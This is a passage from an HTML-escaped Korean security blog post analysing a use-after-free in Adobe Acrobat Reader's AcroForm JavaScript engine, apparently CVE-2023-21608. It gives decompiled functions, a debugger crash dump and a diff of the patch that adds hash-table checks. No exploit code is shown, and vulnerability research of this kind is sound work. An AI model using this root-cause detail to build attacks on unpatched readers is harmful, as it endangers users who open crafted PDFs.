&amp;#xD574;&amp;#xC81C;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;GetRichValueEventProp&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *arg0, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a3)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
...
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    LOBYTE(v16) = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    sub_2085ECA0(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;EventRichValueInProgress&amp;quot;&lt;/span&gt;);
    sub_20AAE7D6(arg0, v16, v17, v18, v19, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;15&lt;/span&gt;);
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a1
      &amp;amp;&amp;amp; (v9 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 (__fastcall **)(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))(dword_21473CB8 + &lt;span class=&#34;hljs-number&#34;&gt;180&lt;/span&gt;),
          v10 = __guard_check_icall_fptr(a1),
          v9(v10)) )
    {
      PointerType = sub_20A4AD65(a1, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CAgg_P&amp;quot;&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( PointerType )
        PointerType = CAggToESVal(PointerType, v12, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)a3, PointerType);&lt;span class=&#34;hljs-comment&#34;&gt;// Free All CAgg &amp;amp; map&lt;/span&gt;
    }
...
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC5EC;&amp;#xAE30;&amp;#xAE4C;&amp;#xC9C0;&amp;#xB9CC; &amp;#xBCF4;&amp;#xBA74; &amp;#xB531;&amp;#xD788; &amp;#xD070; &amp;#xBB38;&amp;#xC81C;&amp;#xB294; &amp;#xC5C6;&amp;#xC5B4; &amp;#xBCF4;&amp;#xC774;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB4E4;&amp;#xC758; &amp;#xD574;&amp;#xC81C;&amp;#xAC00; &amp;#xC5F4;&amp;#xAC70;&amp;#xAC00; &amp;#xC544;&amp;#xC9C1; &amp;#xB05D;&amp;#xB098;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC774;&amp;#xD6C4; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;!!!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=04f6a0f0 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000000 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=420fefd0 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=44e1cff8 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=6921ef50 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=420fefd0
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=6c556b99 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=04f6a0d0 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=04f6a0fc &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl nz na pe nc
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00010206
AcroForm!CAgg::operator[](unsigned short)+0xe:
6c556b99 8b07            mov     eax,dword ptr [edi]  ds:002b:&lt;span class=&#34;hljs-attribute&#34;&gt;420fefd0&lt;/span&gt;=????????&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;page-heap&amp;#xC744; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xD558;&amp;#xACE0; &amp;#xBC84;&amp;#xADF8;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; Use-After-Free&amp;#xB85C; &amp;#xC778;&amp;#xD574; &lt;code&gt;AcroForm!CAgg::operator[]&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xBCF4;&amp;#xBA74; if&amp;#xBB38; &amp;#xC548;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;this-&amp;gt;type&lt;/code&gt; &amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xB54C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD588;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;this&lt;/code&gt;&amp;#xAC00; UAF&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC788;&amp;#xB2E4;&amp;#xACE0; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __userpurge CAgg::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[]@&amp;lt;eax&amp;gt;(CAgg *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;@&amp;lt;ecx&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; (*a2)[&lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;]@&amp;lt;ebx&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *someID)
{
  ...

  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;type == &lt;span class=&#34;hljs-number&#34;&gt;0x13&lt;/span&gt; )
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    ...
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      CAgg::convert(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, a2, &lt;span class=&#34;hljs-number&#34;&gt;0x14&lt;/span&gt;);
      v4 = (_DWORD *)&lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[](&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v9, (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)&amp;amp;someID);
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; *v4 + &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;;
  }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;AcroForm!EScript_ESObjectEnum_CallbackProc&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB85C; &lt;code&gt;CAgg:operator[]&lt;/code&gt;&amp;#xC758; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;(&lt;code&gt;this&lt;/code&gt;)&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xB294; &lt;code&gt;pCagg&lt;/code&gt;&amp;#xAC00; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xBA70; &amp;#xC774;&amp;#xB294; &lt;code&gt;pCAggData&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC628; &amp;#xC8FC;&amp;#xC18C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __usercall EScript_ESObjectEnum_CallbackProc@&amp;lt;eax&amp;gt;(
        &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; (*ebx0)[&lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;]@&amp;lt;ebx&amp;gt;,
        &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2,
        &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *key_str,
        &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *a4,
        &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; ***pCAggData)
{
  CAgg **pCagg; &lt;span class=&#34;hljs-comment&#34;&gt;// edi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 someID; &lt;span class=&#34;hljs-comment&#34;&gt;// ax&lt;/span&gt;
  CAgg *v7; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;

  pCagg = (CAgg **)*pCAggData;
  someID = (*(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; (__cdecl **)(&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *))(gCoreHFT + &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;))(key_str); 
  v7 = (CAgg *)CAgg::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[]((CAgg *)pCagg, ebx0, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)someID);
  ESValToCAgg(v7, a4, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;3-&amp;#xD328;&amp;#xCE58;-&amp;#xBD84;&amp;#xC11D;&#34;&gt;&lt;a href=&#34;#3-&amp;#xD328;&amp;#xCE58;-&amp;#xBD84;&amp;#xC11D;&#34; class=&#34;headerlink&#34; title=&#34;3.  &amp;#xD328;&amp;#xCE58; &amp;#xBD84;&amp;#xC11D;&#34;&gt;&lt;/a&gt;3.  &amp;#xD328;&amp;#xCE58; &amp;#xBD84;&amp;#xC11D;&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xAC00; Acrobat&amp;#xC758; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8; &amp;#xC5D4;&amp;#xC9C4;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC774;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD560; &amp;#xB54C;&amp;#xB3C4; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xACE0; &amp;#xB4A4;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4;&amp;#xB8F0; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xB9C8;&amp;#xCC2C;&amp;#xAC00;&amp;#xC9C0;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xD3C9;&amp;#xC18C;&amp;#xC5D0; &amp;#xBCF4;&amp;#xB358; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xB4E4;&amp;#xACFC;&amp;#xB294; &amp;#xACB0;&amp;#xC774; &amp;#xB2E4;&amp;#xB974;&amp;#xB2E4;&amp;#xB294;&amp;#xAC8C; &amp;#xB290;&amp;#xAEF4;&amp;#xC9C0;&amp;#xB124;&amp;#xC694; &amp;#x1F972;&lt;/p&gt;
&lt;p&gt;&amp;#xBC14;&amp;#xB85C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xAE30; &amp;#xC804;&amp;#xC5D0; &amp;#xBA3C;&amp;#xC800; &amp;#xC774; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xD328;&amp;#xCE58;&amp;#xB418;&amp;#xC5C8;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;! &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xC544;&amp;#xB2CC; &amp;#xB9CC;&amp;#xD07C; &amp;#xD328;&amp;#xCE58; &amp;#xB610;&amp;#xD55C; &amp;#xCF54;&amp;#xB4DC; &amp;#xD55C; &amp;#xB450;&amp;#xC904;&amp;#xC5D0;&amp;#xC11C; &amp;#xB05D;&amp;#xB0A0;&amp;#xB9AC; &amp;#xC5C6;&amp;#xACA0;&amp;#xC8E0;? &lt;/p&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xD328;&amp;#xCE58;&amp;#xB41C; &amp;#xBC84;&amp;#xC804;(Adobe Acrobat Reader DC 2022.003.20310)&amp;#xACFC; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;(Adobe Acrobat Reader DC 2022.001.20085)&amp;#xC758; &lt;code&gt;AcroForm.api&lt;/code&gt;&amp;#xB97C; Diffing&amp;#xD558;&amp;#xC5EC; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xACB0;&amp;#xACFC;&amp;#xB97C; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;primary&amp;#xC640; secondary&amp;#xB294; &amp;#xAC01;&amp;#xAC01; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;&amp;#xACFC; &amp;#xD328;&amp;#xCE58;&amp;#xB41C; &amp;#xBC84;&amp;#xC804;&amp;#xC758; &lt;code&gt;AcroForm.api&lt;/code&gt; &amp;#xC774;&amp;#xACE0; &amp;#xB458; &amp;#xC0AC;&amp;#xC774;&amp;#xC5D0; match&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4; &amp;#xC911;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC84;&amp;#xADF8;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; &amp;#xBCC0;&amp;#xACBD;&amp;#xC810;&amp;#xC744; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF8; &amp;#xACB0;&amp;#xACFC; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;SetRichValueEventProp&lt;/code&gt;&amp;#xACFC; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;, &lt;code&gt;SetRichChangeEventProp&lt;/code&gt;&amp;#xACFC; &lt;code&gt;GetRichChangeEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xCC28;&amp;#xC774;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%201.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC911;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;&amp;#xC758; &amp;#xCC28;&amp;#xC774;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740;&amp;#xB370;&amp;#xC694;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%202.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB178;&amp;#xB780;&amp;#xC0C9;&amp;#xC73C;&amp;#xB85C; &amp;#xD45C;&amp;#xC2DC;&amp;#xB41C; Basic Block&amp;#xC740; &amp;#xD328;&amp;#xCE58; &amp;#xC804;&amp;#xD6C4;&amp;#xB85C; &amp;#xCC28;&amp;#xC774;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; Match&amp;#xB418;&amp;#xB294; Basic Block&amp;#xC73C;&amp;#xB85C; &amp;#xC67C;&amp;#xCABD;&amp;#xC774; primary(&amp;#xD328;&amp;#xCE58; &amp;#xC804;), &amp;#xC624;&amp;#xB978;&amp;#xCABD;&amp;#xC774; secondary(&amp;#xD328;&amp;#xCE58; &amp;#xD6C4;)&amp;#xC774;&amp;#xBA70; &amp;#xD30C;&amp;#xB780;&amp;#xC0C9;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xC640; Basic Block&amp;#xC740; primary&amp;#xC5D0;&amp;#xB294; &amp;#xC5C6;&amp;#xC9C0;&amp;#xB9CC; secondary&amp;#xC5D0;&amp;#xB294; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xB098;&amp;#xD0C0;&amp;#xB0C5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC989; &amp;#xD328;&amp;#xCE58;&amp;#xB85C; &amp;#xCD94;&amp;#xAC00;&amp;#xB41C; &amp;#xD30C;&amp;#xB780;&amp;#xC0C9; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD574;&amp;#xACB0;&amp;#xD558;&amp;#xB294; &amp;#xCF54;&amp;#xB4DC;&amp;#xB77C;&amp;#xACE0; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xAC70;&amp;#xC8E0;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &amp;#xD06C;&amp;#xAC8C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xB450; &amp;#xAC00;&amp;#xC9C0; &amp;#xBCC0;&amp;#xACBD;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xAC00; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xB418;&amp;#xB294; &lt;code&gt;CAggToESVal&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C; &amp;#xC804;, &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xD638;&amp;#xCD9C;&amp;#xC774; &amp;#xC120;&amp;#xD589;&amp;#xB418;&amp;#xACE0; &amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xBC18;&amp;#xD658; &amp;#xAC12;&amp;#xC774; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; Basic Block&amp;#xC73C;&amp;#xB85C;&amp;#xC758; &amp;#xBD84;&amp;#xAE30; &amp;#xC5EC;&amp;#xBD80;&amp;#xB97C; &amp;#xACB0;&amp;#xC815;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; Basic Block&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C; &amp;#xC804;&amp;#xD6C4;&amp;#xB85C; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt;&amp;#xACFC; &lt;code&gt;DeleteFromGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;  PointerType = sub_20A4BC05(v31, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;);
  PointerType_1 = PointerType;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( PointerType )
  {
    LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !(_BYTE)PointerType )
    {
      v15 = InsertToGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31, PointerType_1);
      LOBYTE(v33) = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
      CAggToESVal((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v15, v16, PropName, PointerType_1);
      PointerType = DeleteFromGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31);
    }
  }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;AcroForm.api&lt;/code&gt;&amp;#xC740; &amp;#xC2EC;&amp;#xBCFC;&amp;#xC774; &amp;#xC5C6;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC744; &amp;#xC815;&amp;#xC131;&amp;#xC2A4;&amp;#xB7FD;&amp;#xAC8C; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF8; &amp;#xACB0;&amp;#xACFC; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xACFC; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0; &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt;&amp;#xC640; &lt;code&gt;DeleteFromGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xB4F1; &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xAE30;&amp;#xB2A5;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xBD99;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
